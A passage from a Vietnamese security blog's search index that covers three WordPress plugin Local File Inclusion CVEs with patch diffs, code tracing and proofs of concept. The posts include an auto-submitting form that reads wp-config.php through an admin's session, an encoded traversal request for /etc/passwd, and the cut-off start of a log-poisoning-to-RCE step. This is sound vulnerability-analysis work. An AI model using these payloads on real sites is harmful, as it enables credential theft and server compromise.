true, khiến điều kiện kiểm tra bị bỏ qua và lỗ hổng có thể kích hoạt. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web có form, tự động gửi request với LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rGửi link đến trang web cho admin hoặc người dùng có đặc quyền Cảnh báo Lỗ hổng này chỉ khai thác được trên Windows, vì hàm file_exists() xử lý đường dẫn khác nhau giữa hai hệ điều hành. Trên Linux, nếu đường dẫn chứa thư mục không tồn tại, hàm sẽ trả về false. Trong khi đó, trên Windows, cùng đường dẫn đó lại có thể trả về true, khiến điều kiện kiểm tra bị bỏ qua và lỗ hổng có thể kích hoạt. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#step-1"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web có form, tự động gửi request với LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rGửi link đến trang web cho admin hoặc người dùng có đặc quyền Cảnh báo Lỗ hổng này chỉ khai thác được trên Windows, vì hàm file_exists() xử lý đường dẫn khác nhau giữa hai hệ điều hành. Trên Linux, nếu đường dẫn chứa thư mục không tồn tại, hàm sẽ trả về false. Trong khi đó, trên Windows, cùng đường dẫn đó lại có thể trả về true, khiến điều kiện kiểm tra bị bỏ qua và lỗ hổng có thể kích hoạt. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#step-2"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 2025.1.0 của WP REST Cache cho phép Local File Inclusion qua tham số sub. Bản vá 2025.1.1 giải quyết bằng cách kiểm tra vị trí file trước khi include — đảm bảo file chỉ được nạp nếu nằm trong thư mục partials, từ đó loại bỏ khả năng path traversal/LFI. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rLấy dữ liệu trực tiếp từ request và ghép vào đường dẫn file là rủi ro LFI. Luôn xác thực vị trí thực tế của file (đường dẫn tuyệt đối) trước khi include. Kiểm soát phạm vi file bằng so sánh thư mục đích (whitelist) hiệu quả hơn chỉ sanitize ký tự. Kiểm tra trên nhiều nền tảng (Windows/Linux) vì hành vi hàm file có thể khác nhau. ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress WP REST Cache Plugin \u003c= 2025.1.0 is vulnerable to Local File Inclusion ","date":"2025-10-20","objectID":"/vi/posts/2025-10-20-cve-2025-52716/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/vi/posts/2025-10-20-cve-2025-52716/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress LatePoint Plugin.","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin LatePoint phiên bản ≤ 5.1.93 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-6715 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.1.93 Patched Versions: 5.1.94 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress LatePoint Plugin ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - LatePoint: 5.1.93 (vulnerable) và 5.1.94 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ // rendering layout, view variable will be passed and used in layout file include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-\u003eadd_extension($layout, '.php'); }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } Trong phiên bản lỗi, hàm render() gắn .php vào $layout và include trực tiếp mà không kiểm tra, dẫn đến Local File Inclusion (LFI) nếu $layout bị kiểm soát từ đầu vào. Bản vá: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ $layout_path = $this-\u003eget_safe_layout_path($layout); // rendering layout, view variable will be passed and used in layout file if($layout_path){ include $layout_path; }else{ __('Invalid layout', 'latepoint'); } }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } private function get_safe_layout_path($layout) { // 1. Remove any path separators and null bytes $layout = str_replace(['/', '\\\\', \"\\0\"], '', $layout); // 2. Remove any dots to prevent directory traversal $layout = str_replace('.', '', $layout); // 3. Only allow alphanumeric, underscore, and hyphen $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout); // 4. Construct the full path $layout_file = $this-\u003eadd_extension($layout, '.php'); $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file; // 5. Use realpath to resolve any remaining traversal attempts $real_path = realpath($full_path); $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH); // 6. Ensure the resolved path is within the layouts directory if ($real_path \u0026\u0026 $base_path \u0026\u0026 strpos($real_path, $base_path) === 0) { return $real_path; } return false; } Bản vá đã thêm get_safe_layout_path() để loại bỏ /, \\, . và null byte; chỉ cho phép [A-Za-z0-9_-]; xây dựng đường dẫn, dùng realpath() và so sánh với LATEPOINT_VIEWS_LAYOUTS_ABSPATH. Nếu hợp lệ mới include, ngăn chặn LFI. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rHàm render() được gọi tại 12 vị trí khác nhau, nên việc trace thủ công sẽ rất mất thời gian. 12 vị trí gọi hàm render() Để tối ưu, ta sử dụng debugger: Đặt breakpoint trong hàm render(). Thực hiện lần lượt các thao tác trong giao diện (UI). Mỗi khi render() được gọi, chương trình sẽ tạm dừng tại breakpoint và highlight dòng code tương ứng, giúp xác định nhanh luồng gọi hàm. Video debugger nhảy đến break point 👉 Khi truy cập endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view với route name là các submenu của plugin thì render() được gọi với layout mặc định là admin Layout mặc định Quan sát callstack, ta thấy được luồng gọi hàm đến render() Luồng gọi hàm trong callstack function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){ $html = ''; if($this-\u003eget_return_format() == 'json'){ if(is_array($view_name)) $view_name = $view_name['json_view_name']; $response_html = $this-\u003erender($this-\u003eget_view_uri($view_name, $from_shared_folder), 'none', $extra_vars); $this-\u003esend_json(array_merge(array('status' =\u003e LATEPOINT_STATUS_SUCCESS, 'message' =\u003e $response_html), $json_return_vars)); }else{ if(is_array($view_name)) $view_name = $view_name['html_view_name']; $this-\u003eextra_css_classes[] = $this-\u003egenerate_css_class($view_name); $this-\u003evars['extra_css_classes'] = $this-\u003eextra_css_classes; $html = $this-\u003erender($this-\u003eget_view_uri($view_name, $from_shared_folder), $this-\u003eget_layout(), $extra_vars); } return $html; } render() được format_render_return() gọi khi get_return_format() không phải là json, mặc định nó là html $return_format = 'html' ... function get_return_format(){ return $this-\u003ereturn_format; } layout mà ta cần quan tâm là giá trị trả về của get_layout() =\u003e có get_layout() thì cũng sẽ có set_layout(), ta tìm với từ khóa set_layout trong cùng file để xem giá trị layout được set như nào. $layout = 'admin' ... function set_layout($layout = 'admin'){ if(isset($this-\u003eparams['layout'])){ $this-\u003elayout = $this-\u003eparams['layout']; }else{ $this-\u003elayout = $layout; } } Biến $layout được gán giá trị mặc định là 'admin', tương ứng với layout mà ta đã phân tích trước đó. Hàm set_layout() có nhiệm vụ xác định layout sẽ sử dụng: Nếu trong $this-\u003eparams có tồn tại tham số layout, thì hàm sẽ dùng giá trị đó. Ngược lại, nếu không có, nó sẽ gán layout mặc định ('admin'). Ta tiếp tục tận dụng sức mạnh của debugger, quan sát biến $params Giá trị của $params $params bao gồm 2 key là page và route_name tương đương với params string khi ta truy cập endpoint http://localhost/wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view 👉 Như vậy layout cũng là param được truyền trong URL, ta tận dụng điều này để khai thác. Thử truy cập endpoint trên với layout param GET /wp-admin/admin.php?page=latepoint\u0026route_name=calendars__view\u0026layout=payload HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=latepoint Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175 $layout đã được ta hoàn toàn kiểm soát $layout được kiểm soát ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web có form, tự động gửi request với LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80/wp-admin/admin.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"latepoint\"\u003e \u003cinput type=\"text\" name=\"route_name\" value=\"calendars__view\"\u003e \u003cinput type=\"text\" name=\"layout\" value=\"../../../../../../wp-config\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2\rGửi link đến trang web cho admin hoặc người dùng có đặc quyền Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công Thông tin\rVì đây là CVE được công bố Unauthenticated, nên ta tận dụng plugin không check nonce để người dùng đã đăng nhập truy cập vào link trang web độc hại rồi tự gửi request đến trang WordPress đó kèm theo cookie. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web có form, tự động gửi request với LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rGửi link đến trang web cho admin hoặc người dùng có đặc quyền Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công Thông tin\rVì đây là CVE được công bố Unauthenticated, nên ta tận dụng plugin không check nonce để người dùng đã đăng nhập truy cập vào link trang web độc hại rồi tự gửi request đến trang WordPress đó kèm theo cookie. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#step-1"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rTạo trang web có form, tự động gửi request với LFI payload \u003c!DOCTYPE html\u003e Document Step 2\rGửi link đến trang web cho admin hoặc người dùng có đặc quyền Result: Debugger đã nhảy đến wp-config.php Kết quả LFI thành công Thông tin\rVì đây là CVE được công bố Unauthenticated, nên ta tận dụng plugin không check nonce để người dùng đã đăng nhập truy cập vào link trang web độc hại rồi tự gửi request đến trang WordPress đó kèm theo cookie. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#step-2"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 5.1.93 của LatePoint cho phép LFI vì tham số layout không được xác thực trước khi include(), dẫn tới khả năng đọc tệp cục bộ (ví dụ wp-config.php). Lỗ hổng được vá trong 5.1.94 bằng cách lọc ký tự, dùng realpath() và giới hạn thư mục hợp lệ. ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rĐây là LFI (đọc file) — không có bằng chứng RCE trong PoC. Tham số điều khiển đường dẫn phải được sanitize + canonicalize trước khi dùng. Dùng realpath() và kiểm tra base dir để ngăn traversal. Không include trực tiếp dữ liệu từ request; xây hàm an toàn như get_safe_layout_path(). ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:4:3","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rFile Inclusion/Path traversal — Hacktrick WordPress LatePoint Plugin \u003c= 5.1.93 is vulnerable to Local File Inclusion ","date":"2025-10-19","objectID":"/vi/posts/2025-10-19-cve-2025-6715/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/vi/posts/2025-10-19-cve-2025-6715/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Hide My WP Ghost Plugin.","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Hide My WP Ghost phiên bản ≤ 5.4.01 chứa lỗ hổng Local File Inclusion cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh include/require, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã. CVE ID: CVE-2025-26909 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.4.01 Patched Versions: 5.4.02 CVSS severity: High (9.6) Required Privilege: Unauthenticated Product: WordPress Hide My WP Ghost Plugin ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Hide My WP Ghost: 5.3.02 (vulnerable) và 5.4.02 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return $new_url; } Hàm getOriginalUrl() dùng để phân tích và tái tạo lại URL gốc dựa trên các quy tắc rewrite trong hệ thống. Trong phiên bản lỗi, giá trị $new_url không được làm sạch trước khi trả về, cho phép kẻ tấn công chèn đường dẫn độc hại như ../../etc/passwd dẫn đến nguy cơ LFI. Bản vá: public function getOriginalUrl( $url ) { // Build the rewrite rules if they are not already built if ( empty( $this-\u003e_rewrites ) ) { $this-\u003ebuildRedirect(); } // Parse the URL components $parse_url = wp_parse_url( $url ); // Only if there is a path to change if( !isset( $parse_url['path'] ) ) { return $url; } // Get the home root path $path = wp_parse_url( home_url(), PHP_URL_PATH ); // Backslash the paths if ( $path \u003c\u003e '' ) { $parse_url['path'] = preg_replace( '/^' . preg_quote( $path, '/' ) . '/', '', $parse_url['path'] ); } // Replace paths to original based on rewrite rules if ( isset( $this-\u003e_rewrites['from'] ) \u0026\u0026 isset( $this-\u003e_rewrites['to'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['from'] ) \u0026\u0026 ! empty( $this-\u003e_rewrites['to'] ) ) { $parse_url['path'] = preg_replace( $this-\u003e_rewrites['from'], $this-\u003e_rewrites['to'], $parse_url['path'], 1 ); } // Default to https if the scheme is not set if ( ! isset( $parse_url['scheme'] ) ) { $parse_url['scheme'] = 'https'; } // Reconstruct the URL if ( isset( $parse_url['port'] ) \u0026\u0026 $parse_url['port'] \u003c\u003e 80 ) { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . ':' . $parse_url['port'] . $path . $parse_url['path']; } else { $new_url = $parse_url['scheme'] . '://' . $parse_url['host'] . $path . $parse_url['path']; } // Append query string if present if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } // Return the constructed URL return sanitize_url( $new_url ); } Bản vá gọi sanitize_url($new_url) trước khi trả về, giúp loại bỏ đường dẫn hoặc scheme nguy hiểm, từ đó ngăn chặn khả năng LFI. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rgetOriginalUrl() được gọi trong hàm showFile(), gán giá trị trả về cho $new_url public function showFile( $url ) { // other logic $new_url = $this-\u003egetOriginalUrl( $url ); $new_url_no_query = ( ( strpos( $new_url, '?' ) !== false ) ? substr( $new_url, 0, strpos( $new_url, '?' ) ) : $new_url ); $new_path = $this-\u003egetOriginalPath( $new_url ); $ctype = false; if ( $ext = $this-\u003eisFile( $new_url ) ) { // other logic } elseif ( strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getOption( 'hmwp_login_url' ) . '/' ) || strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_login_url' ) . '/' ) ) { // other logic } elseif ( $url \u003c\u003e $new_url ) { if ( stripos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_wp-json' ) . '/' ) !== false ) { // other logic } elseif ( strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' ) . '/' ) !== false || strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_wp-signup_url' ) . '/' ) !== false ) { ob_start(); include $new_path; $content = ob_get_clean(); header( \"HTTP/1.1 200 OK\" ); //Echo the html file content echo $content; exit(); } elseif ( ! HMWP_Classes_Tools::getValue( 'nordt' ) ) { // other logic } } } include $new_path là điểm có thể gây LFI; để thực thi được, các điều kiện bao quanh phải được thỏa mãn. $url khác $new_url Trong getOriginalUrl() đoạn xử lý query: if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } wp_parse_url( 'http://localhost/x/abc?' ) -\u003e có path nhưng query rỗng (hoặc query không được set / empty). Điều kiện isset(...) \u0026\u0026 ! empty(...) sẽ fail với ? không có param, nên không append gì vào $new_url. $new_url trả về http://localhost/x/abc (không có ?), trong khi $url ban đầu là http://localhost/x/abc? do đó khác nhau và ($url \u003c\u003e $new_url) là true. Biến $new_url_no_query phải chứa chuỗi '/' . HMWP_Classes_Tools::getDefault('hmwp_activate_url') . '/'. Khi tìm trong mã nguồn plugin với từ khóa hmwp_activate_url, ta thấy hàm HMWP_Classes_Tools::getDefault('hmwp_activate_url') trả về giá trị wp-activate.php. Kết quả trả về của HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' ) Do đó, điều kiện thực tế là $new_url_no_query phải chứa /wp-activate.php/. 👉 Như vậy, để đoạn include $new_path được thực thi, URL phải có ký tự ? ở cuối (để $url \u003c\u003e $new_url) và chứa /wp-activate.php/ trong đường dẫn. $new_path là giá trị trả về của getOriginalPath($new_url) public function getOriginalPath( $new_url ) { // Remove domain from path $new_path = str_replace( home_url(), '', $new_url ); // Remove queries from path if ( strpos( $new_path, '?' ) !== false ) { $new_path = substr( $new_path, 0, strpos( $new_path, '?' ) ); } return HMWP_Classes_Tools::getRootPath() . ltrim( $new_path, '/' ); } Hàm này trả về path gốc không chứa params string, ví dụ: \"http://localhost/x/wp-activate.php?\" -\u003e \"/srv/www/wordpress/x/wp-activate.php\" Như vậy ta đã có các điều kiện cần thiết để LFI xảy ra, ta cần tìm luồng gọi đến showFile() public function maybeShowNotFound() { //If the file doesn't exist //show the file content if ( is_404() ) { $this-\u003eshowFile( $this-\u003egetCurrentURL() ); } else { $this-\u003emaybeShowLogin( $this-\u003egetCurrentURL() ); } } showFile() được maybeShowNotFound nếu client request đến tài nguyên không tồn tại với tham số là kết quả trả về của getCurrentURL(). public function getCurrentURL() { $url = ''; if ( isset( $_SERVER['HTTP_HOST'] ) ) { // build the URL in the address bar $url = is_ssl() ? 'https://' : 'http://'; $url .= $_SERVER['HTTP_HOST']; $url .= rawurldecode( $_SERVER['REQUEST_URI'] ); } return $url; } URI lấy từ $_SERVER['REQUEST_URI'] được decode rồi concat vào $url để trả về. Ta đặt debug trong hàm showFile() và gửi request đ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rGửi request với LFI payload GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Debug: Debugger với valid payload Result: Kết quả LFI thành công Giải thích: /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? sau khi decode sẽ trở thành /x/wp-activate.php/..///..///..///..///../etc/passwd? Ta dùng chuỗi này để đánh lừa Apache, khiến Apache không phát hiện việc vượt Document Root. Nếu dùng /x/wp-activate.php/../../../../../etc/passwd? sẽ bị phát hiện vượt Document Root. /// vẫn được chấp nhận tương đương /, ví dụ: w41bu1@22NS088:~$ ls ///////// bin boot cdrom dev etc home lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var swap.img ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Log poisoning → LFI → RCE\rStep 1\rGửi request với PHP code đặt trong User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php 